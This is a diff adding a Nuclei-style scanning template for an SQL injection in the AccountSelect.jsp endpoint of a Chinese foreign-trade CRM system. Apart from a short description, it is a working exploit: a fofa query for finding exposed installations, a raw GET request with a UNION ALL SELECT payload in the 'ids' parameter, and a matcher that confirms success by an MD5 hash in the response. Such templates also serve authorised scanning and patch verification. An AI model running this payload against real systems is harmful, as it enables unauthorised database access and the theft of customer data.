@@ -1,0 +1,28 @@
+id: weida-crm-accountselect-sqli
+
+info:
+  name: "维达外贸客户关系管理系统 AccountSelect 接口 SQL 注入"
+  author: 0dayPoc
+  severity: high
+  description: |-
+    fofa: title="维达外贸客户关系管理系统"
+      该系统 AccountSelect 接口参数过滤机制存在缺陷，允许攻击者通过注入恶意 SQL 语句操控数据库查询逻辑，可能导致敏感数据泄露或权限突破。此漏洞影响系统核心数据交互功能，需通过 fofa 指纹定位目标资产并验证注入点有效性。
+  tags: 维达外贸客户关系管理系统
+
+http:
+- raw:
+  - |
+    GET /wap/common/AccountSelect.jsp?ids=1%29+UNION+ALL+SELECT+NULL%2CNULL%2CCHAR%28126%29%2Bsys.fn_sqlvarbasetostr(HashBytes(%27MD5%27,%271%27))%2BCHAR%28126%29%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL--+x&returnType=11 HTTP/1.1
+    Host: {{Hostname}}
+    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+    Accept-Encoding: gzip, deflate
+    Accept-Language: zh-CN,zh;q=0.9
+    Cookie: td_cookie=1074457600; JSESSIONID=39181F19E13050D67C506E097115F619
+  matchers-condition: and
+  matchers:
+  - type: status
+    status: [200]
+  - type: word
+    part: body
+    words:
+    - 'c4ca4238a'
